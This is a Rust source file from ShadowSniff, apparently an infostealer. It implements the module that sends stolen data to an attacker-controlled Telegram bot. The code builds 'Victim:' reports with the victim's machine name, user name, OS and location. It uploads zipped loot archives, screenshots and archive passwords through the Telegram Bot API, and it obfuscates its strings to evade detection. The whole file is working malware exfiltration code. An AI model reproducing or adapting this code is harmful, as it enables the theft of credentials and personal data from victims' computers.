/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use alloc::{format, vec};
use collector::display::{CollectorBlock, CollectorDisplay};
use collector::{Collector, Device};
use core::fmt::{Display, Error, Formatter};
use derive_new::new;
use indoc::formatdoc;
use ipinfo::{IpInfo, unwrapped_ip_info};
use obfstr::obfstr as s;
use requests::{
    BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder, write_file_field,
    write_text_field,
};
use utils::pc_info::PcInfo;
use utils::{format_size, internal_code_to_flag};

const TELEGRAM_MAX_FILE_SIZE: usize = 2 * 1024 * 1024 * 1024;

/// A log sender that transmits data via a Telegram bot using the Bot API.
///
/// # Fields
///
/// - `chat_id`: The unique identifier of the target Telegram chat or channel (as a string).
/// - `token`: The bot token obtained from [BotFather](https://t.me/BotFather).
///
/// # Notes
///
/// - Telegram has a file upload limit of 2 GB per file.
#[derive(new, Clone)]
pub struct TelegramBotSender {
    #[new(into)]
    chat_id: Arc<str>,
    #[new(into)]
    token: Arc<str>,
}

struct TelegramBlockDisplay<'a>(&'a CollectorBlock<'a>);

impl Display for TelegramBlockDisplay<'_> {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        writeln!(f, "{} <b>{}</b>", self.0.emoji, self.0.name)?;

        let len = self.0.fields.len();
        for (i, field) in self.0.fields.iter().enumerate() {
            let prefix = if i == len - 1 { "└─" } else { "├─" };
            writeln!(
                f,
                "<code>{}</code> {} {}: <code>{}</code>",
                prefix, field.emoji, field.name, field.value
            )?;
        }

        Ok(())
    }
}

fn generate_caption<P, C>(
    log_content: &LogContent,
    password: Option<P>,
    collector: &C,
) -> (String, Option<String>)
where
    P: AsRef<str>,
    C: Collector,
{
    let PcInfo {
        computer_name,
        user_name,
        product_name,
    } = PcInfo::retrieve();
    let IpInfo { country, city, .. } = unwrapped_ip_info();

    let caption = formatdoc! {r#"
            ✨ New log from {country_flag} <code>{city}</code>
            Victim: <code>{computer_name}</code>/<code>{user_name}</code> on <code>{product_name}</code>

            {collector}
        "#,
        country_flag = internal_code_to_flag(&country).map(Arc::from).unwrap_or(country.clone()),
        collector = collector.display_blocks()
            .iter()
            .map(TelegramBlockDisplay)
            .map(|x| x.to_string())
            .collect::<Vec<_>>()
            .join("\n")
    };

    let link = match log_content {
        LogContent::ExternalLink(ExternalLink {
            service_name,
            link,
            size,
        }) => Some(format!(
            r#"<a href="{link}">Download</a> from {service_name} <code>{size}</code>"#,
            size = format_size(*size as _)
        )),
        _ => None,
    };

    let password = password.map(|password| {
        let password = password.as_ref();
        format!(r#"Password: <code>{password}</code>"#)
    });

    let mut parts = vec![];
    if let Some(l) = link {
        parts.push(l);
    }
    if let Some(p) = password {
        parts.push(p);
    }

    parts.push("\n<i>by <a href=\"https://github.com/sqlerrorthing/ShadowSniff\">SnadowSniff</a>, made with ❤️</i>".to_string());

    let thumbnail = if parts.is_empty() {
        None
    } else {
        Some(parts.join("\n"))
    };

    (caption, thumbnail)
}

#[derive(Default)]
pub struct MediaGroup {
    items: Vec<MediaItem>,
}

pub struct MediaItem {
    media_type: String,
    media: String,
    caption: Option<String>,
    parse_mode: Option<String>,
}

impl MediaGroup {
    pub fn add_document(
        &mut self,
        media_name: impl Into<String>,
        caption: Option<String>,
    ) -> &mut Self {
        self.items.push(MediaItem {
            media_type: s!("document").to_string(),
            media: format!("attach://{}", media_name.into()),
            caption,
            parse_mode: Some(s!("HTML").to_string()),
        });
        self
    }

    pub fn add_photo(
        &mut self,
        media_name: impl Into<String>,
        caption: Option<String>,
    ) -> &mut Self {
        self.items.push(MediaItem {
            media_type: s!("photo").to_string(),
            media: format!("attach://{}", media_name.into()),
            caption,
            parse_mode: Some(s!("HTML").to_string()),
        });
        self
    }
}

impl Display for MediaItem {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            r#"{{"type": "{}","media": "{}""#,
            self.media_type, self.media
        )?;

        if let Some(caption) = &self.caption {
            let escaped = caption.replace('\\', "\\\\").replace('"', "\\\"");
            write!(f, r#","caption": "{escaped}""#)?;
        }

        if let Some(parse_mode) = &self.parse_mode {
            write!(f, r#","parse_mode": "{parse_mode}""#)?;
        }

        write!(f, "}}")
    }
}

impl Display for MediaGroup {
    fn fmt(&self, f: &mut Formatter<'_>) -> Result<(), Error> {
        let json = self
            .items
            .iter()
            .map(ToString::to_string)
            .collect::<Vec<_>>()
            .join(",");

        write!(f, "[{json}]")
    }
}

impl TelegramBotSender {
    fn send_as_file(
        &self,
        log_name: &str,
        archive: &[u8],
        screenshot: Option<Vec<u8>>,
        caption: String,
        thumbnail: Option<String>,
    ) -> Result<(), SendError> {
        let mut builder = MultipartBuilder::new("----BoundaryMediaGroup");

        write_text_field!(builder, "chat_id" => &self.chat_id);

        let mut media_group = MediaGroup::default();

        if let Some(screenshot_bytes) = &screenshot {
            media_group.add_document("screenshot", Some(caption));
            media_group.add_document("logfile", thumbnail);

            write_file_field!(
                builder,
                "screenshot",
                "screenshot.png",
                "image/png",
                screenshot_bytes
            );
        } else {
            let combined_caption = combine_caption_and_thumbnail(&caption, thumbnail);
            media_group.add_document("logfile", Some(combined_caption));
        }

        let media_json = media_group.to_string();

        write_text_field!(builder, "media" => &media_json);
        write_file_field!(builder, "logfile", log_name => "application/zip", archive);

        self.send_request(s!("sendMediaGroup"), builder)?;

        Ok(())
    }

    fn send_as_link(
        &self,
        screenshot: Option<Vec<u8>>,
        caption: String,
        thumbnail: Option<String>,
    ) -> Result<(), SendError> {
        let combined_caption = combine_caption_and_thumbnail(&caption, thumbnail);

        match screenshot {
            Some(photo_bytes) => {
                let mut builder = MultipartBuilder::new("----BoundaryPhoto");
                write_text_field!(builder, "chat_id" => &self.chat_id);
                write_text_field!(builder, "caption" => &combined_caption);
                write_text_field!(builder, "parse_mode", "HTML");
                write_file_field!(
                    builder,
                    "photo",
                    "screenshot.png",
                    "image/png",
                    &photo_bytes
                );

                self.send_request(s!("sendPhoto"), builder)?
            }
            None => {
                let mut builder = MultipartBuilder::new("----BoundaryPhoto");
                write_text_field!(builder, "chat_id" => &self.chat_id);
                write_text_field!(builder, "text" => &combined_caption);
                write_text_field!(builder, "parse_mode", "HTML");

                self.send_request(s!("sendMessage"), builder)?
            }
        }

        Ok(())
    }

    fn send_request(&self, method: &str, body: MultipartBuilder) -> Result<(), SendError> {
        let content_type = body.content_type();
        let body = body.finish();

        Request::post(format!(
            "https://api.telegram.org/bot{}/{}",
            self.token, method
        ))
        .header(s!("Content-Type"), &content_type)
        .body(body)
        .build()
        .send()
        .ok()
        .ok_or(SendError::Network)?;

        Ok(())
    }
}

fn combine_caption_and_thumbnail(caption: &str, thumbnail: Option<String>) -> String {
    match thumbnail {
        Some(tn) if !tn.is_empty() => format!("{caption}\n{tn}"),
        _ => caption.to_string(),
    }
}

impl LogSender for TelegramBotSender {
    fn send<P, C>(
        &self,
        log_file: LogFile,
        password: Option<P>,
        collector: &C,
    ) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector,
    {
        if let LogContent::ZipArchive(archive) = &log_file.content
            && archive.len() >= TELEGRAM_MAX_FILE_SIZE
        {
            return Err(SendError::LogFileTooBig);
        }

        let (caption, thumbnail) = generate_caption(&log_file.content, password, collector);
        let LogFile { name, content } = log_file;

        match content {
            LogContent::ZipArchive(archive) => self.send_as_file(
                &name,
                &archive,
                collector.get_device().get_screenshot(),
                caption,
                thumbnail,
            ),
            LogContent::ExternalLink(_) => {
                self.send_as_link(collector.get_device().get_screenshot(), caption, thumbnail)
            }
        }
    }
}
